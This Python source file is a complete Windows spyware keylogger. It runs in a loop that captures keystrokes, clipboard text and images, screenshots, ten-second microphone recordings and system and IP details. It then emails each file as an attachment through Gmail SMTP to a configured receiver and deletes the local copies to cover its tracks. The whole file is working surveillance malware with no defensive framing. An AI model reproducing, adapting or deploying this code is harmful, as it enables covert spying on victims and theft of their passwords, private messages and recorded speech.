
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from PIL import Image, ImageGrab

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
clipboard_screenshot_information = "clipboard_screenshot.png"
email_address = ""   #sender's email
password = ""  #16 digit app password from google  


toaddr = ""   #receiver's mail 

file_path = "" # Enter the file path 
extend = "\\"
file_merge = file_path + extend

# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, 'rb') as attachment_file:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment_file.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    s.sendmail(fromaddr, toaddr, msg.as_string())
    s.quit()

#send_email(keys_information, file_path + extend + keys_information, toaddr)

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

#computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

#copy_clipboard()

# get the microphone
def microphone():
    fs = 44100
    seconds = 10

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)
#microphone()

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

def save_clipboard_image():
    # Grab image from clipboard
    image = ImageGrab.grabclipboard()
    if isinstance(image, Image.Image):
        # Save image to file
        image.save(os.path.join(file_path, clipboard_screenshot_information))
        print("Image from clipboard saved as:", os.path.join(file_path, clipboard_screenshot_information))
        return True  # Return True if the image was saved successfully
    else:
        print("No image found in clipboard.")
        return False  # Return False if no image was found

keys = []
def on_press(key):
    global keys

        #print(key)
    keys.append(key)

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                    #f.close()
            elif k.find("Key") == -1:
                f.write(k)
                    #f.close()

# Main loop
while True:
    # Reset keys for each cycle
    keys = []

    # Start listening for key presses
    with Listener(on_press=on_press) as listener:
        time.sleep(10)  # Wait for 30 seconds to collect keystrokes
        listener.stop()  # Stop listening after 30 seconds

    # Write collected keystrokes to file
    write_file(keys)

    # Collect other data
    computer_information()
    copy_clipboard()
    microphone()  # Record audio for 30 seconds
    screenshot()  # Take a screenshot
    save_clipboard_image()  # Save the image from the clipboard
    image_saved = save_clipboard_image()
    # Send all collected files via email
    send_email(keys_information, file_path + extend + keys_information, toaddr)
    send_email(system_information, file_path + extend + system_information, toaddr)
    send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
    send_email(audio_information, file_path + extend + audio_information, toaddr)
    send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
    send_email(clipboard_screenshot_information, file_path + extend + clipboard_screenshot_information, toaddr)
    if image_saved:
        send_email(clipboard_screenshot_information, file_path + extend + clipboard_screenshot_information, toaddr)
    # delete files after sending
    delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
    for file in delete_files:
        try:
            os.remove(file_path + extend + file)
            print(f"Deleted: {file}")
        except Exception as e:
            print(f"Error deleting {file}: {e}")
    time.sleep(10)
